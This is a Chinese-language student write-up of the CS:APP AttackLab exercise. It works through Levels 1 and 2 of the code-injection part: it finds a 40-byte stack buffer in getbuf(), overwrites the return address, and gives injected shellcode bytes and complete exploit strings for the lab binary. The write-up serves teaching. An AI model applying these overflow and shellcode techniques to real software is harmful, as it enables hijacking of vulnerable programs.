# AttackLab
------------------------------
## 实验目的:
由于C语言中gets()不检查输入字符的边界,可能导致栈被破坏.造成漏洞,这个Lab就用来Attack原始代码,使原始代码执行不应该执行的那部分程序.包括两部分:      
   
- Code Injection Attacks    
- Return-Oriented Programming
   
第一个部分包括3个phase, 是利用字符串将重定向程序以执行现有过程。   
第二个部分
## 实验准备:
- GDB调试工具
- GDB调试常用命令

## 实验过程
首先用```objdump -d ctarget > ctarget_disassemble.txt```将```ctarget```和```rtarget```反汇编到文件中.   
方便分析.   
## PartI Code Injection Attacks
### Level1 : 执行Touch1
由题意可得,```test()```函数中调用了```getbuf()```读入字符串,且调用完后,返回.即:
  
	1 void test()
	2 {
	3 int val;
	4 val = getbuf();
	5 printf("No exploit. Getbuf returned 0x%x\n", val);
	6 }
那么我们调用```getbuf()```后,可能栈会遭到破会,从而返回的函数地址发生变化.这样就不是```printf(...)```作为返回了.   
什么函数用到了```test()```?  
发现```launch()```的汇编代码中有:```callq 401968 <test>```,而```main()函数```中的```stable_launch()```中又调用了```launch()```.   
故我们只需关心```stable_launch()```函数即可,我们继续观察```getbuf()```.

	 00000000004017a8 <getbuf>:
	  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
	  4017ac:	48 89 e7             	mov    %rsp,%rdi
	  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
	  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
	  4017b9:	48 83 c4 28          	add    $0x28,%rsp
	  4017bd:	c3                   	retq   
	  4017be:	90                   	nop
	  4017bf:	90                   	nop

首先```sub $0x28 , %rsp```.说明BUFFER_SIZE为40个字节.我们在观察```touch()```函数的地址,为:
```00000000004017c0 <touch1>:````.   

故此时答案已经可以确定了,首先我们给随便40个字节的字符,之后再加上我们要跳转的地址(8字节),即:
```c0 17 40 00 00 00 00 00```这里是小端方式,故答案如下:  
![](https://i.imgur.com/wb0kwKI.png) 

### Level2:插入攻击代码,执行Touch2()
这个phase目的是,插入一小段攻击代码,并顺利执行```Touch2()```.
   
	1 void touch2(unsigned val)
	2 {
	3 vlevel = 2; / * Part of validation protocol* /
	4 if (val == cookie) {
	5 printf("Touch2!: You called touch2(0x%.8x)\n", val);
	6 validate(2);
	7 } else {
	8 printf("Misfire: You called touch2(0x%.8x)\n", val);
	9 fail(2);
	10 }
	11 exit(0);
	12 }

即在执行Touch2()之前,我们需要设置参数```val```,使其等于我们各自的```cookie```.      
故根据```Phase1()```,我们将攻击代码写入到字符串中,并修改返回地址,使返回地址变成这个字符串的开头,这样就可以执行我们需要的代码了.     
编写攻击代码如下:   

	mov $0x59b997fa , %rdi  # 将cookie值放入rdi中,作为参数
	pushq $0x4017ec         # 关键一步,我们将Touch2()的地址入栈.以便执行
	retq                    # 这一步也关键,retq将rip指针指向返回地址,即修改后的$0x4017ec,即执行Touch2()

然后,放完缓冲区之后,紧接着就是修改返回地址.那么返回地址按我们的想法应该改为字符buffer的起始地址.也就是```sub 0x28, %rsp```之后的```rsp```的值.在执行该语句之前,rsp为```0x5561dca0``` .进入GDB调试:  
![](https://i.imgur.com/1bexbZ2.png)
得到```0x5561dc78```.故这就是我们需要的返回地址.   
那么答案就得到了:    
首先将攻击代码翻译为机器码:        
step1: ```gcc -c touch2.s```     
step2: ```objdump -d touch2.o > touch2.d```     
```touch2.d```中保存的即为机器码:  
![](https://i.imgur.com/lrXezYs.png)
接着,我们将返回地址也填入字符buffer中,最终的答案即为:

	48 c7 c7 fa 97
	b9 59 68 ec 17
	40 00 c3 00 00
	00 00 00 00 00
	00 00 00 00 00
	00 00 00 00 00
	00 00 00 00 00
	00 00 00 00 00
	78 dc 61 55 00
	00 00 00

这里面有几个细节要注意一下:
    
- 首先,在```getbuf()```执行到```retq```后,这个时候才开始跳转到buffer起始地址,并准备执行攻击代码.      
此时rsp指针地址也不再是第一次准备执行```getbuf()```时的地址了,而是又向上(向栈底)增大了8个字节.即从```0x5561dca0```变为```0x5561dca8```,这就是由于```getbuf()```执行了```retq```,返回地址被弹出,所以```rsp```向栈底移动.  
- 然后开始执行攻击代码,此处可以看作一次```callq```,攻击代码中```pushq $0x4017ec <Touch2()>```,将```Touch2()```地址入栈,此时```rsp```地址为```0x5561dca0```,也就是这个调用攻击代码栈帧中的"返回地址",值为```Touch2()```起始地址.之后再次调用```retq```,同理此时弹出```pop``` "返回地址",此时```rip```就指向了```Touch2()```.同时,由于popq了返回地址,此时```rsp```又变为```0x5561dca8```.
- 总结来说,返回"攻击代码"实际上时一次```call和ret```,用这个```ret```来```call Touch2()```.